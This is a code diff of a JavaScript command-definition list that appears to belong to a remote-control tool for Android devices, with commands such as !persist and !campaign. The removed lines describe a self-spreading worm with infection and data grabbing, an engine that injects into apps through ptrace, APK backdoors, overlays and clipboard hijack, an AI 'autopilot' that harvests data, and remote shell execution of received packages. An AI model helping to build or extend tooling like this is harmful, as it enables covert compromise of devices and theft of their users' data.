@@ -155,10 +155,10 @@ export const COMMAND_DEFS = [
   },
   {
     cmd: '!config',
-    args: 'get, push <json>, reset, write <type> <name> <b64>, exec <name>, payload <json>, feed <name>, list, status, shell <cmd>, inspect <name>, clear',
-    description: 'Config Engine — package receiver & executor. write: receive package (type=sh/apk/dex/so/zip/json). exec: execute received package. feed: feed result to worm. list: list packages. shell: run shell cmd. inspect: package details. clear: reset engine.',
+    args: 'get, push <json>, or reset',
+    description: 'Remote configuration management',
     category: 'system',
-    output: 'Config/execution/worm-feed status',
+    output: 'Config JSON or status',
   },
   {
     cmd: '!persist',
@@ -264,34 +264,6 @@ export const COMMAND_DEFS = [
     description: 'Create a directory',
     category: 'files',
     output: 'Directory creation confirmation',
-  },
-  {
-    cmd: '!brain',
-    args: 'status, report, start, stop, fix, fixlog, inject, heal, reset',
-    description: 'Agent Brain — auto-fix module. status: fix history. fix: force fix cycle. fixlog: show log. inject: force auto-inject. heal: run heal loop. reset: clear all state',
-    category: 'power',
-    output: 'Brain status/fix report',
-  },
-  {
-    cmd: '!inject',
-    args: 'scan, targets, run <#|pkg>, auto, status, history',
-    description: 'Injection engine — scan target apps, inject into high-value packages with real techniques (ptrace, APK backdoor, WebView, overlay, clipboard hijack, etc.)',
-    category: 'power',
-    output: 'Injection results/target list',
-  },
-  {
-    cmd: '!worm',
-    args: 'status, start, stop, stealth, kill, log, infect, grab <target>',
-    description: 'Worm engine — autonomous spreading, infection, and data grab',
-    category: 'power',
-    output: 'Worm status/infection results',
-  },
-  {
-    cmd: '!ai device',
-    args: 'on, off, scan, poc, inject, execute <plan>, harvest, history, clear, config <key> <val>',
-    description: 'Device AI Autopilot commands. on: enable autopilot. off: disable. scan: deep environment scan. poc: generate POC report. inject: auto-inject into targets. execute <plan>: run action plan. harvest: collect gathered data. history: show action history.',
-    category: 'power',
-    output: 'Autopilot results from device',
   },
   {
     cmd: '!campaign',
